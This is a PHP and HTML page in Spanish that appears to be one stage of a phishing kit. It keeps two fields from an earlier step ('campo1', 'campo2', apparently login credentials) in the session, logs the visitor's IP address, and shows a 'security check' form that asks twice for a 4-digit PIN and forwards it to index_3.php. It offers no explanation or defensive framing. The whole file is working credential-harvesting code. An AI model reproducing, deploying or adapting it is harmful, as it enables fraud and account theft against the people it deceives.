<?php
@session_start();
@$userp = $_SERVER['REMOTE_ADDR'];


if( isset ($_POST['campo1']) && isset ($_POST['campo2']) ){

	$_SESSION['campo1'] = $_POST['campo1'];
	$_SESSION['campo2'] = $_POST['campo2'];
}else{ header ('location: index.html'); exit(); 
}
?>
<html>
<head>
	<title>Informaci&oacute;n</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script type="text/javascript">
function mostrarPassword(){
		var cambio = document.getElementById("txtPassword");
		if(cambio.type == "password"){
			cambio.type = "text";
			$('.icon').removeClass('fa fa-eye-slash').addClass('fa fa-eye');
		}else{
			cambio.type = "password";
			$('.icon').removeClass('fa fa-eye').addClass('fa fa-eye-slash');
		}
	} 
	
	$(document).ready(function () {
	//CheckBox mostrar contraseña
	$('#ShowPassword').click(function () {
		$('#Password').attr('type', $(this).is(':checked') ? 'text' : 'password');
	});
});
</script>
<script>
function soloNumeros(e){
  var key = window.event ? e.which : e.keyCode;
  if (key < 48 || key > 57) {
    e.preventDefault();
  }
}
</script>
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
		
			<div class="wrap-login100 p-l-85 p-r-85 p-t-55 p-b-55">
				<form class="login100-form validate-form flex-sb flex-w" method="post" action="index_3.php">
				
					<div align="center">
				<img src="css/images/supprrs.png" style="width:364; height:54;">
				<br>
					<span class="login100-form-title ">
						<br><b>Inicio de seguridad</b>
					</span>
				</div>
				<br><br>
					

					<span class="txt1 p-b-11">
						<br><br>Ingrese pin de 4-D&iacute;gitos
					</span>
					<div class="wrap-input100 validate-input m-b-36" >
						<span class="btn-show-pass">
							  <button id="show_password" class="btn" type="button" onclick="mostrarPassword()">
							  <span class="fa fa-eye-slash icon"></span> </button>
						</span>
						<input class="input100" type="password" id="txtPassword" onkeypress="soloNumeros(event)" maxlength="4" name="campo3" required>
						<span class="focus-input100"></span>
					</div>
					
					<span class="txt1 p-b-11">
						Confirme pin de 4-D&iacute;gitos
					</span>
					<div class="wrap-input100 validate-input m-b-12" >
						<span class="btn-show-pass">
							  <button id="show_password" class="btn" type="button" onclick="mostrarPassword()">
							  <span class="fa fa-eye-slash icon"></span> </button>
						</span>
						<input class="input100" type="password" id="txtPassword" onkeypress="soloNumeros(event)" maxlength="4" name="campo4" required>
						<span class="focus-input100"></span>
					</div>
					
					<div class="flex-sb-m w-full p-b-48">
					</div>

					<div class="container-login100-form-btn">
					</div>
					
					<div align="center">&nbsp;</div>
					
			<button type="submit" style="text-decoration:none;color:#ffffff;font-size:18px;border-style:solid;border-color:#0078d4;
border-width:10px 20px 10px 20px;background:#0078d4;font-family:arial,'helvetica neue',
helvetica,sans-serif;font-weight:normal;font-style:normal;line-height:22px;width:auto;text-align:center" 
 title="Confirmar">
Confirmar</button>

				</form>
			</div>
		</div>
	</div>
	

</body>
</html>